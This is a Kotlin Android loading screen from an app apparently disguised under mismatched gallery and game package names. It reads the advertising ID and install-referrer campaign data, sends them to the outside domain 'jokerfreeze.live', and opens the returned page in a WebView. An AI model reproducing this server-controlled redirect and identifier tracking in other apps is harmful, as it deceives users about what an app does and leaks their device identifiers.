package vault.gallery.loc.ui.loading

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Bundle
import android.os.Parcelable
import android.util.Log
import android.widget.TextView
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.collectLatest
import kotlinx.coroutines.launch
import leagueofmonkeys.torqueburnou.data.Repo
import vault.gallery.loc.FileDataCreator
import vault.gallery.loc.MyService
import vault.gallery.loc.R
import vault.gallery.loc.os.OneSignalTouchWrapper
import vault.gallery.loc.ui.game.GameActiv
import vault.gallery.loc.ui.wv.InterActivity
import java.lang.String
import javax.inject.Inject
import kotlin.getValue
import kotlin.toString

@AndroidEntryPoint
class LoadingActiv : AppCompatActivity() {

    @Inject
    lateinit var repository: Repo

    private val viewModel: LoadingViewModel by viewModels()
    var gadid = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)

        lifecycleScope.launch {
            val url = repository.getUrl()

            if (!url.isNullOrEmpty()){
                Log.e("GETURL", "URLis = ${url}")

                val intent = Intent(this@LoadingActiv, InterActivity::class.java)
                intent.putExtra("web_url", url)
                startActivity(intent)
            } else {
                Log.e("GETURL", "Datastore is null")

                lifecycleScope.launch(Dispatchers.IO) {
                    gadid = AdvertisingIdClient.getAdvertisingIdInfo(this@LoadingActiv).id.toString()
                    OneSignalTouchWrapper(application).init(gadid)
                    Log.e("Gadid", " gadid id $gadid")

                    viewModel.createInstallReferrerRequest()

                    val mMessageReceiver: BroadcastReceiver = object : BroadcastReceiver() {
                        override fun onReceive(context: Context?, intent: Intent) {
                            val message = intent.getStringExtra("Status")
                            val url = FileDataCreator.create(
                                res = application.resources,
                                baseFileData = "jokerfreeze.live/" + "lokerfreeze.php",
                                gadid = gadid,
                                campaign = message.toString(),

                                )
                            Log.e("Url", "url is - $url")

                            val intent = Intent(this@LoadingActiv, InterActivity::class.java)
                            intent.putExtra("web_url", url)
                            startActivity(intent)

                        }
                    }
                    LocalBroadcastManager.getInstance(this@LoadingActiv).registerReceiver(
                        mMessageReceiver, IntentFilter("GPSLocationUpdates")
                    )
                    viewModel.stringToSend.collectLatest { referrerData ->
                        if (referrerData.isNotEmpty()) {
                            val intent = Intent(this@LoadingActiv, MyService::class.java)
                            intent.putExtra("referrerData", referrerData)
                            intent.putExtra("gadid", gadid)
                            startService(intent)
                        }
                    }

                }
            }
        }

    }
}